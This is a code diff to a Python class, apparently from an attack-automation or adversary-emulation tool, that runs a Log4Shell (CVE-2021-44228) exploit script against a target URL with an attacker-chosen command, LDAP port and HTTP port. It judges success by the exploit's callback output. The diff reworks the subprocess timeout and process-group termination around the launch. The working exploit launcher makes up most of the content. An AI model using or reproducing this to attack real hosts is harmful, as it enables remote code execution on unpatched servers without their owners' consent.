@@ -1,8 +1,8 @@
 import os
 import string
 import random
+import signal
 import subprocess
-import time as t
 from pathlib import Path
 from shutil import copyfile, rmtree
 
@@ -352,9 +352,8 @@ class Trainman:
         os.environ['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
         os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         env.update(os.environ)
-        exploit_cve_2021_44228_cmd = [
+        exploit_cve_2021_44228_cmd = \
             f'python3 main.py -i {self.host_info[2]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
-        ]
         exploit_cve_2021_44228 = subprocess.Popen(
             exploit_cve_2021_44228_cmd,
             stdin=subprocess.PIPE,
@@ -362,37 +361,33 @@ class Trainman:
             stderr=subprocess.PIPE,
             shell=True,
             env=env,
-            cwd=r'/L4sh'
+            cwd=r'/L4sh',
+            preexec_fn=os.setsid
         )
-        if exploit_cve_2021_44228.stdout:
-            timeout = t.time() + 10
-            output = None
-            for exploit_line in exploit_cve_2021_44228.stdout:
-                if b'New HTTP Request 200' in exploit_line:
-                    output = {
-                        'outcome': 'success',
-                        'message': 'exploit_cve_2021_44228 succeeded',
-                        'forward_log': 'True'
-                    }
-                    break
-                if not output and t.time() > timeout:
-                    output = {
-                        'outcome': 'failed',
-                        'message': 'exploit_cve_2021_44228 executed but failed to exploit target',
-                        'forward_log': 'True'
-                    }
-                    break
-            exploit_cve_2021_44228.terminate()
+        try:
+            exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate(timeout=10)
+        except:
+            os.killpg(os.getpgid(exploit_cve_2021_44228.pid), signal.SIGTERM)
+            exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate()
+        if exploit_cve_2021_44228_output:
+            if 'New HTTP Request 200' in exploit_cve_2021_44228_output.decode():
+                output = {
+                    'outcome': 'success',
+                    'message': 'exploit_cve_2021_44228 succeeded',
+                    'forward_log': 'True'
+                }
+            else:
+                output = {
+                    'outcome': 'failed',
+                    'message': 'exploit_cve_2021_44228 executed but failed to exploit target',
+                    'forward_log': 'True'
+                }
         else:
-            message = None
-            for line in exploit_cve_2021_44228.stderr:
-                message = message + line.decode('ascii')
             output = {
                 'outcome': 'failed',
-                'message': message,
+                'message': exploit_cve_2021_44228_error.decode(),
                 'forward_log': 'True'
             }
-            exploit_cve_2021_44228.terminate()
         return output
 
     def echo(self):
